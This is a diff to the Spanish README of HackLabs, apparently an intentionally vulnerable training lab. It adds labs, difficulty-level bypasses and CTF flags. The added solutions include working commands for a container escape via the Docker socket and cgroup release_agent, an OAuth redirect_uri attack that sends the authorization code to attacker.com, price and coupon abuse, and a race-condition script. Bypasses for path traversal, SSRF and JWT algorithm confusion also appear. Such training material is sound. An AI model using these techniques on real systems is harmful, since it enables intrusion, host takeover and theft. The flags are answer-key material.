@@ -16,7 +16,7 @@
 
 ## 🎯 Características
 
-- **28 laboratorios** cubriendo OWASP Top 10 + vulnerabilidades avanzadas + IA Attacks
+- **32 laboratorios** cubriendo OWASP Top 10 + vulnerabilidades avanzadas + IA Attacks
 - Guías de resolución paso a paso (ES/EN)
 - Filtros de labs por criticidad (Critical / High / Medium)
 - Soporte **bilingüe** (Español / English)
@@ -49,16 +49,20 @@
 | Lab | Riesgo | Técnica |
 |-----|--------|---------|
 | API Attacks – Laboratorio de APIs Inseguras | 🔴 Critical | API con endpoints inseguros: auth rota, exposición de datos, inyección, falta de autorización |
+| Business Logic Flaws | 🟠 High | Manipulación de precio client-side, cantidad negativa, cupones apilables |
 | C2 – Sliver (Command & Control) | 🔴 Critical | Sliver C2: generar implant, mTLS listener, transferir y ejecutar payloads |
+| Container Escape | 🔴 Critical | Docker socket, privileged container, cgroup release_agent |
 | CORS Misconfiguration | 🟠 High | Reflejo de Origin + Allow-Credentials |
 | CSRF – Cross-Site Request Forgery | 🟠 High | Cambio de contraseña sin token |
-| File Upload sin restricciones | 🔴 Critical | Subida de webshell sin restricciones |
+| File Upload sin restricciones | 🔴 Critical | Webshell PHP, bypass doble extensión, reverse shell |
 | Insecure Deserialization | 🔴 Critical | Python `pickle.loads()` → RCE |
-| JWT Manipulation | 🟠 High | `alg=none`, secreto débil (hashcat) |
+| JWT Manipulation | 🟠 High | `alg=none`, secreto débil (hashcat), algorithm confusion RS256→HS256 |
 | Login Bruteforce | 🟡 Medium | Hydra, Medusa, CrackMapExec |
+| OAuth 2.0 Attacks | 🟠 High | `redirect_uri` sin validar → robo de authorization code |
 | Open Redirect | 🟡 Medium | Parámetro URL sin whitelist |
-| Path Traversal / LFI | 🟠 High | `../../etc/passwd` |
+| Path Traversal / LFI | 🟠 High | `../../etc/passwd`, log poisoning → RCE |
 | Privilege Escalation (SSH) | 🔴 Critical | SUID, sudo misconfiguration, cron |
+| Race Condition / TOCTOU | 🟠 High | Transferencias concurrentes, TOCTOU, requests paralelos |
 | SSTI – Server-Side Template Injection | 🔴 Critical | Jinja2 `render_template_string` → RCE |
 | XSS – Cross-Site Scripting | 🟠 High | Reflected, Stored, DOM |
 | XXE – XML External Entity | 🟠 High | XML External Entity |
@@ -200,9 +204,11 @@ HackLabs incluye un **selector de dificultad** en la barra de navegación (simil
 
 | Nivel | Comportamiento |
 |-------|---------------|
-| Easy | Sin filtro — SSRF a servicios internos directamente |
-| Medium | Bloquea `localhost`, `127.0.0.1` (bypass: IP decimal, 0x7f000001) |
-| Hard | Bloquea rangos privados (bypass: DNS rebinding, IPv6) |
+| Easy | Sin filtro — acceso directo a `/internal/cloud-metadata` (credenciales AWS simuladas) |
+| Medium | Bloquea `localhost`, `127.0.0.1` (bypass: IP decimal `2130706433`, `0.0.0.0`, `127.0.0.2`) |
+| Hard | Bloquea rangos privados (bypass: IPv6 `[::1]`, double URL encoding, redirect chain) |
+
+Flag: `HL{55rf_cl0ud_m3t4d4t4}` (dentro de las credenciales IAM del endpoint de metadatos)
 
 </details>
 
@@ -287,8 +293,10 @@ sliver (ID) > ps
 | Nivel | Comportamiento |
 |-------|---------------|
 | Easy | Acepta `alg=none` + secreto expuesto en la interfaz |
-| Medium | Rechaza `alg=none` pero secreto débil (bypass: brute force con hashcat) |
-| Hard | Rechaza `alg=none` + secreto fuerte (bypass: kid injection, jwt_tool) |
+| Medium | Rechaza `alg=none` pero secreto débil `secret` (bypass: brute force con hashcat / jwt_tool) |
+| Hard | Algorithm confusion RS256→HS256: clave pública expuesta en `/jwt/jwks`, usada como secreto HMAC |
+
+Flag hard: `HL{4lg_c0nfu510n_0wn3d}`
 
 </details>
 
@@ -319,9 +327,11 @@ sliver (ID) > ps
 
 | Nivel | Comportamiento |
 |-------|---------------|
-| Easy | Sin filtro — `../` traversal directo |
-| Medium | Filtra `../` una sola vez (bypass: `....//` doble traversal) |
-| Hard | Filtra `../` y `..\` recursivamente |
+| Easy | Sin filtro — `../` traversal directo + log poisoning via User-Agent |
+| Medium | Filtra `../` una sola vez (bypass: `....//`, URL encoding `%2e%2e%2f`) |
+| Hard | Filtra `../` y `..\` recursivamente (bypass: double URL encoding `%252e%252e%252f`) |
+
+El servidor registra cada petición en `logs/access.log` incluyendo el User-Agent. Accesible via LFI como `../../logs/access.log`. En servidores con mod_php, envenenar el log con PHP en el User-Agent permite ejecución de código.
 
 </details>
 
@@ -376,6 +386,112 @@ sliver (ID) > ps
 | Easy | Sin protección XXE — `resolve_entities` habilitado |
 | Medium | Bloquea protocolo `file://` (bypass: SSRF con `http://` a servicios internos) |
 | Hard | Bloquea `DOCTYPE`, `ENTITY`, `SYSTEM`, `PUBLIC` case-insensitive |
+
+</details>
+
+<details>
+<summary><strong>Business Logic Flaws</strong></summary>
+
+| Nivel | Comportamiento |
+|-------|---------------|
+| Easy | Precio enviado como campo oculto en el formulario (bypass: modificar `price=1`) |
+| Medium | Precio validado server-side pero cantidad negativa no validada + cupones apilables sin límite |
+| Hard | Precio y cantidad validados + tracking de cupones por sesión |
+
+```bash
+# Easy — manipulación de precio
+curl -X POST http://TARGET_IP/shop/cart/add \
+  -b "session=SESS" -d "product_id=1&price=1&qty=1"
+curl -X POST http://TARGET_IP/shop/checkout -b "session=SESS"
+
+# Medium — cupones apilables (50%+50% = gratis)
+curl -X POST http://TARGET_IP/shop/coupon -b "session=SESS" -d "code=LABS50"
+curl -X POST http://TARGET_IP/shop/coupon -b "session=SESS" -d "code=LABS50"
+curl -X POST http://TARGET_IP/shop/checkout -b "session=SESS"
+```
+
+Flag: `HL{bu51n355_l0g1c_0wn3d}`
+
+</details>
+
+<details>
+<summary><strong>Container Escape</strong></summary>
+
+| Nivel | Comportamiento |
+|-------|---------------|
+| Easy | Docker socket montado (`/var/run/docker.sock`) — escape via `docker run` desde dentro |
+| Medium | Contenedor privileged — escape via `mount /dev/sda1` + `chroot` |
+| Hard | Cgroup release_agent — escape sin socket ni privileged, solo `CAP_SYS_ADMIN` |
+
+```bash
+# Easy — Docker socket escape
+docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh
+cat /root/root.txt
+
+# Medium — privileged + fdisk
+fdisk -l && mkdir /tmp/hostdisk
+mount /dev/sda1 /tmp/hostdisk && chroot /tmp/hostdisk
+
+# Hard — cgroup release_agent
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd && echo "id > ${host_path}/output" >> /cmd && chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" && cat /output
+```
+
+</details>
+
+<details>
+<summary><strong>OAuth 2.0 Attacks</strong></summary>
+
+| Nivel | Comportamiento |
+|-------|---------------|
+| Easy | `redirect_uri` sin validar — cualquier URL aceptada |
+| Medium | Solo valida el dominio (bypass: misma base + path diferente, o Open Redirect en el dominio) |
+| Hard | Whitelist exacta (bypass: encadenamiento con `/open_redirect` del mismo servidor) |
+
+```bash
+# Easy — redirigir código a servidor atacante
+curl "http://TARGET_IP/oauth/authorize?client_id=hacklabs-app&redirect_uri=http://attacker.com/steal&state=x&scope=read"
+# El código llega a attacker.com — intercambiarlo:
+curl -X POST http://TARGET_IP/oauth/token \
+  -d "code=CODE&client_id=hacklabs-app&client_secret=app-secret-123&redirect_uri=http://attacker.com/steal"
+curl http://TARGET_IP/oauth/userinfo -H "Authorization: Bearer TOKEN"
+```
+
+Flag: `HL{0auth_r3d1r3ct_0wn3d}`
+
+</details>
+
+<details>
+<summary><strong>Race Condition / TOCTOU</strong></summary>
+
+| Nivel | Comportamiento |
+|-------|---------------|
+| Easy | Sin lock + `sleep(0.15)` entre check y write — ventana de carrera amplia |
+| Medium | TOCTOU: check fuera del lock, write dentro (sigue vulnerable con timing) |
+| Hard | Lock correcto — requiere alta concurrencia (Burp Turbo Intruder, wrk, 50+ threads) |
+
+```bash
+# Easy/Medium — 10 requests simultáneos con Python
+python3 -c "
+import requests, threading
+def t():
+    requests.post('http://TARGET_IP/race/transfer',
+        json={'from':'alice','to':'bob','amount':500},
+        headers={'Content-Type':'application/json'})
+threads = [threading.Thread(target=t) for _ in range(10)]
+[t.start() for t in threads]; [t.join() for t in threads]
+"
+# Si bob supera $10 → race condition explotada
+
+# Hard — Burp Turbo Intruder o wrk
+wrk -t50 -c50 -d5s -s post.lua http://TARGET_IP/race/transfer
+```
+
+Flags: `HL{r4c3_c0nd1t10n_3z}` / `HL{t0ct0u_m3d1um}` / `HL{h4rd_r4c3_pr3c1s10n}`
 
 </details>
 
@@ -655,7 +771,7 @@ Todos los labs están diseñados para ser explotados con herramientas nativas de
 ```
 Burp Suite · sqlmap · hydra · medusa · ncrack · crackmapexec
 tplmap · jwt_tool · hashcat · john · curl · ffuf · nikto
-wfuzz · gobuster · metasploit · nmap
+wfuzz · gobuster · metasploit · nmap · wrk · weevely · nc
 ```
 
 ---
@@ -683,7 +799,7 @@ HackLabs/
     ├── base.html           # Layout base con sidebar + navbar
     ├── index.html          # Home con tarjetas de labs y filtros
     ├── _lab_header.html    # Cabecera reutilizable de cada lab
-    └── labs/               # 26 templates individuales de labs
+    └── labs/               # 32 templates individuales de labs
 ```
 
 ---
